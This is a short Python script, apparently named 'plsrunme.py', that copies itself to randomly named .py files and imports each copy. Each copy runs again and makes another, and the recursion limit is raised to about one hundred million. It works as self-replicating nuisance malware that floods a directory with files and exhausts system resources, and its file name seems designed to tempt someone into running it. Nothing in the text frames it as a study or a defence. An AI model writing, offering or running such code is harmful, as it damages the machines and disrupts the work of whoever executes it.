from shutil import copyfile
import random
from os import system
import sys
sys.setrecursionlimit(100000000)
strings=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
x=random.choice(strings)+str(random.randint(0,100))
i=random.choice(strings+["0","1","2","3","4","5","6","7","8","9"])+str(random.randint(0,100))
z=random.choice(strings+["0","1","2","3","4","5","6","7","8","9"])+str(random.randint(0,100))
file=open(x+i+z+".py", "w")
file.close()
copyfile("plsrunme.py", x+i+z+".py")
exec("import "+x+i+z+'.py')
